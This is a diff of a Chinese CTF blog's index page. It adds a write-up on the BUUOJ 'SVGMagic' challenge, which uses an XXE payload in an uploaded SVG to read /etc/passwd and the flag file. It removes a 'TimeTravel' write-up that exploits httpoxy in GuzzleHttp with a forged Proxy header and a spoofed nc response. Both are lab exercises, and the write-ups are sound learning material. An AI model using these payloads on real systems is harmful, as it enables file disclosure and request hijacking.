@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-count">70</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-count">83</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,6 +279,118 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-SVGMagic</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-09-03 17:38:33 / 修改时间：18:31:03" itemprop="dateCreated datePublished" datetime="2020-09-03T17:38:33+08:00">2020-09-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>848</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>BSidesCTF 2019的SVGMagic。开题让我们上传文件，上传其他文件报500，上传SVG会成功渲染，并显示PNG渲染结果。</p>
+<p>SVG实际上是一个XML文档。因此可能出现XXE问题。我们试一下。翻<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element">参考文档</a>SVG标签中能插入元素的有&lt;text&gt;，所以直接写一个进去：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;512px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;190px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 512 190&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">preserveAspectRatio</span>=<span class="string">&quot;xMidYMid&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">g</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上传看PNG图片即可得到内容。下一步是拿flag。这题当时环境是让我们拿flag.txt，但是位置不知道。所以盲测。找了一圈，最后猜是在程序根目录下，file:///proc/self/cwd/flag.txt。</p>
+
+    <div id="aplayer-aslarXIS" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="19081573" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{f189ef14-aaaa-429d-88eb-08c721bbedff}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1379,124 +1491,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/" class="post-title-link" itemprop="url">BUUOJ刷题-TimeTravel</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2020-06-01 09:02:27 / 修改时间：09:35:51" itemprop="dateCreated datePublished" datetime="2020-06-01T09:02:27+08:00">2020-06-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>2.2k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>V&amp;N 2020公开赛的TimeTravel。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 用到了GuzzleHttp，是个HTTP库来着。如果GET传入flag，会访问127.0.0.1:5000/api/eligible，返回的JSON有{"success":true}就读flag。GET传入file会任意读文件，GET传入phpinfo返回phpinfo()结果。</p>
-<p>显然，直接读flag没可能，不会有那个权限，否则就不会再套层/readflag了。令我们好奇的是，他用了一个GuzzleHttp，显然这个库不是随便找的，一定有问题。</p>
-<p>Google搜一下"guzzlehttp vuln"，排名第一的就告诉我们<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-PHP-GUZZLEHTTPGUZZLE-70104">问题</a>了，HTTP Request Redirection，又名httpoxy。直接搜就能搜到官网，简单来说，PHP等Web框架在CGI模式下运行时，会将传入的HTTP头当作CGI应用程序的环境变量，而对于PHP来说，它会使用getenv()获取环境变量，在php-fpm等CGI模式下会把HTTP头合并到<span class="math inline">\(\_SERVER数组中。因此，如果我们传入Proxy: 127.0.0.1，在PHP端的\)</span>_SERVER会导致出现$_SERVER['HTTP_PROXY']赋值为'127.0.0.1'。而一部分的HTTP库会应用HTTP_PROXY变量作为代理，例如GuzzleHttp。也就是说，如果我们在访问页面时加上一个Proxy: 127.0.0.1:8080的HTTP头，GuzzleHttp访问时会把请求代理给127.0.0.1:8080。我们就有机会修改内容了。</p>
-<p>不过要注意的是，CGI在传入HTTP头时，会添加HTTP_前缀，如HTTP_HOST。</p>
-<p>本题完全符合条件，我们传入Proxy: XXX:YY，就会把对127.0.0.1:5000/api/eligible的请求转发到XXX:YY，我们再修改返回内容即可。</p>
-<p>由于是BUUOJ环境，不能用外部服务器，我们用Linux Labs的nc来完成。</p>
-<p>先用BurpSuite拦截请求</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:26215</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Proxy</span>: 174.1.23.2:8080</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>Proxy地址指向Linux Labs的IP，上面用nc监听8080端口。在Linux Labs上修改返回包。 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span>: Mon, 01 Jun 2020 01:30:05 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.23</span><br><span class="line"><span class="attribute">Content-Length</span>: 12</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
-<p>就可以得到flag了。</p>
-
-    <div id="aplayer-JnNMVJyW" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="4919519" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{d00bc26f-ce1d-406b-8742-91079447e475}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1553,14 +1547,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">301k</span>
+    <span title="站点总字数">302k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:33</span>
+    <span title="站点阅读时长">4:34</span>
   </span>
 </div>
 <div class="busuanzi-count">
